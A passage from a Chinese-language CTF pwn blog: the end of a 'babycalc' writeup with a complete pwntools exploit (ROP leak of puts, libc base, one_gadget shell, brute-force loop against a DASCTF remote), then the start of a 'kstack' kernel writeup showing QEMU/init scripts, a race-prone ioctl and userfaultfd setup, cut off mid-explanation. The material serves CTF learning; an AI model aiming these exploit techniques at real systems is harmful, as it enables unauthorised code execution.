<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd50a0aa00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd50a0aa00</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd50a0aa08</span> —▸ <span class="number">0x400ca3</span> ◂— pop    rdi</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd50a0aa10</span> —▸ <span class="number">0x602018</span> (<span class="built_in">puts</span>@got.plt) —▸ <span class="number">0x7f1af8eb96a0</span> (<span class="built_in">puts</span>) ◂— push   r12</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd50a0aa18</span> —▸ <span class="number">0x602018</span> (<span class="built_in">puts</span>@got.plt) —▸ <span class="number">0x7f1af8eb96a0</span> (<span class="built_in">puts</span>) ◂— push   r12</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x400c18</span>    leave  </span><br><span class="line">► <span class="number">0x400c19</span>    ret    &lt;<span class="number">0x400ca3</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x400ca3</span>    pop    rdi</span><br><span class="line">  <span class="number">0x400ca4</span>    ret    </span><br></pre></td></tr></table></figure>
<p>爆破脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        success(<span class="string">&quot;&gt;&gt; testing&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v3 = [<span class="number">19</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">161</span>, <span class="number">50</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">199</span>, <span class="number">24</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ca3</span></span><br><span class="line">puts_got = <span class="number">0x602018</span></span><br><span class="line">puts_plt = <span class="number">0x4005d0</span></span><br><span class="line"></span><br><span class="line">code = p64(<span class="number">1</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+code.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>拿到远程 puts 地址后，可以到如下网站中查看 libc 版本：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts%3A6a0">libc database search (blukat.me)</a> </li>
</ul>
<p><img src="/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/1675319907757.png" alt="1675319907757"> </p>
<ul>
<li>最后确定 <code>libc6_2.23-0ubuntu11.3_amd64</code></li>
</ul>
<p>在 ROP 链的末尾写上程序某个地方的地址，就可以实现循环，常用的地址有3处：</p>
<ul>
<li><code>main</code>：主函数</li>
<li><code>pwn</code>：存在漏洞的函数</li>
<li><code>start</code>：程序的入口函数</li>
</ul>
<p>经过调试发现前两个函数都不适合进行循环，只有在 ROP 链末端写入 <code>start</code> 才有可能 <code>get shell</code>（其实是试出来的）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babycalc&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x400C80</span></span><br><span class="line">csu_end_addr=<span class="number">0x400C9A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>, <span class="string">&#x27;22084&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">        gdb.attach(p,<span class="string">&quot;b*0x4007F0\n b*0x400BA6\n b*0x40079B\n&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    v3 = [<span class="number">19</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">161</span>, <span class="number">50</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">199</span>, <span class="number">24</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0x0000000000400ca3</span></span><br><span class="line">    pop_rsi_ret = <span class="number">0x0000000000400ca1</span></span><br><span class="line">    puts_got = <span class="number">0x602018</span></span><br><span class="line">    puts_plt = <span class="number">0x4005d0</span></span><br><span class="line">    read_plt = <span class="number">0x4005F0</span></span><br><span class="line">    main_addr = <span class="number">0x400C1A</span></span><br><span class="line">    pwn_addr = <span class="number">0x400789</span></span><br><span class="line">    start_addr = <span class="number">0x400650</span></span><br><span class="line"></span><br><span class="line">    code = p64(<span class="number">1</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">    payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+code.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    puts_libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = puts_libc - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;puts_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line">    success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="number">0x18ce57</span></span><br><span class="line"></span><br><span class="line">    one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">    one_gadget = one_gadgets[<span class="number">3</span>]+libc_base</span><br><span class="line"></span><br><span class="line">    success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">    success(<span class="string">&quot;binsh_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;d&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+<span class="number">0x58</span>*<span class="string">&quot;e&quot;</span>+p64(one_gadget)</span><br><span class="line">    payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">    payload += <span class="string">&#x27;f&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>) </span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        success(<span class="string">&quot;&gt;&gt; testing&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/01/userfaultfd+setxattr+pt_regs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/01/userfaultfd+setxattr+pt_regs/" class="post-title-link" itemprop="url">userfaultfd+setxattr+pt_regs</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-01 11:41:28 / Modified: 11:44:48" itemprop="dateCreated datePublished" datetime="2023-02-01T11:41:28+08:00">2023-02-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>kstack 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot; \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -net user -net nic -device e1000 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<ul>
<li>kaslr，smep</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt;/dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo 2 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">insmod /root/kstack.ko</span><br><span class="line">chmod 777 /proc/stack</span><br><span class="line"></span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">cat /root/banner</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<ul>
<li>kptr_restrict，dmesg_restrict</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure>
<ul>
<li>PTI</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pid = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x35C</span>);</span><br><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0x57AC0001</span> )                      <span class="comment">// PUSH</span></span><br><span class="line">&#123;</span><br><span class="line">  buf = (Element *)kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">0x6000C0</span>LL);</span><br><span class="line">  LODWORD(buf-&gt;pid) = pid;</span><br><span class="line">  ptr = head;</span><br><span class="line">  head = buf; <span class="comment">/* 更新头节点 */</span></span><br><span class="line">  buf-&gt;ptr = ptr; <span class="comment">/* 把原来的头节点挂载到新头节点的后面 */</span></span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(&amp;buf-&gt;value, arg, <span class="number">8LL</span>) ) <span class="comment">/* 拷贝数据到新头节点 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  head = buf-&gt;ptr; <span class="comment">/* 拷贝失败则重置头节点 */</span></span><br><span class="line">  kfree(buf);                               </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>单向链表插头</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd != <span class="number">0x57AC0002</span> )                    <span class="comment">// POP</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    ptr = head;</span><br><span class="line">    <span class="keyword">if</span> ( !head )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( pid == LODWORD(head-&gt;pid) ) <span class="comment">/* 匹配对应线程组的节点 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !copy_to_user(arg, &amp;head-&gt;value, <span class="number">8LL</span>) ) <span class="comment">/* 把数据拷贝到用户态 */</span></span><br><span class="line">      &#123;</span><br><span class="line">        head = ptr-&gt;ptr;</span><br><span class="line">        <span class="keyword">goto</span> EINVAL;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = head-&gt;ptr;</span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( LODWORD(ptr-&gt;pid) != pid ) <span class="comment">/* 遍历所有线程组,直到匹配节点 */</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !ptr-&gt;ptr )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">          ptr = ptr-&gt;ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !copy_to_user(arg, &amp;ptr-&gt;value, <span class="number">8LL</span>) ) <span class="comment">/* 把数据拷贝到用户态 */</span></span><br><span class="line">        &#123;</span><br><span class="line">          ptr-&gt;ptr = ptr-&gt;ptr;</span><br><span class="line">EINVAL:</span><br><span class="line">          kfree(ptr);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>单向链表脱去头节点</li>
</ul>
<p>本题目涉及多线程，但没有加锁，有条件竞争漏洞</p>
<p><strong>userfaultfd</strong></p>
<p>userfaultfd 是 Linux 的一个系统调用，使用户可以通过自定义的页处理程序 page fault handler 在用户态处理缺页异常</p>
<p>先看一个注册 userfaultfd 的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); <span class="comment">/* 生成一个userfaultfd */</span></span><br><span class="line"></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">/* 用户空间将在UFFD上使用READ/POLLIN协议 */</span></span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr;</span><br><span class="line">    ur.range.len = len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">/* 调用UFFDIO_REGISTER ioctl完成注册 */</span></span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd); <span class="comment">/* 启动一个用以进行轮询的线程uffd monitor,该线程会通过poll函数(Linux中的字符设备驱动中的一个函数)不断轮询直到出现缺页异常 */</span></span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当有一个线程（faulting 线程）在这块内存区域内触发缺页异常时，该线程会进入到内核中处理缺页异常</li>
<li>随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给轮询线程（monitor 线程），等待其处理结束</li>
<li>monitor 线程调用通过 ioctl 处理缺页异常（调用函数指针 handler 所指向的函数）</li>
<li>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</li>
</ul>
<p>函数 handler 的模板如下：</p>
